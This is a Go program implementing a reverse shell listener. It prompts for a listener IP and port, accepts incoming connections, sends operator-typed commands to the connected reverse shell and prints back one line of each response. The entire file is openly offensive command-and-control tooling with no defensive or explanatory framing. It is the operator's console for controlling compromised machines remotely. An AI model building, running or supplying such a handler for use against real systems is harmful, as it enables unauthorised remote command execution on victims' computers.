package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {
	// Prompt for LHOST and LPORT
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter LHOST (Listener IP): ")
	lhost, _ := reader.ReadString('\n')
	lhost = strings.TrimSpace(lhost)

	fmt.Print("Enter LPORT (Listener Port): ")
	lport, _ := reader.ReadString('\n')
	lport = strings.TrimSpace(lport)

	// Start the listener
	address := fmt.Sprintf("%s:%s", lhost, lport)
	fmt.Printf("Waiting for connections on %s...\n", address)

	listener, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println("Error starting listener:", err)
		return
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		// Log connection info and handle client
		fmt.Printf("Connection established with %s\n", conn.RemoteAddr().String())
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		// Prompt for input in PuTTY
		fmt.Print("Shell> ")

		// Read command from PuTTY
		commandReader := bufio.NewReader(os.Stdin)
		command, _ := commandReader.ReadString('\n')
		command = strings.TrimSpace(command)

		// Send the command to the reverse shell
		conn.Write([]byte(command + "\n"))

		// Exit if the command is "exit"
		if command == "exit" {
			fmt.Println("Closing connection.")
			break
		}

		// Read response from reverse shell
		response, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Connection closed by client.")
			break
		}

		// Display response in PuTTY
		fmt.Print(response)
	}
}
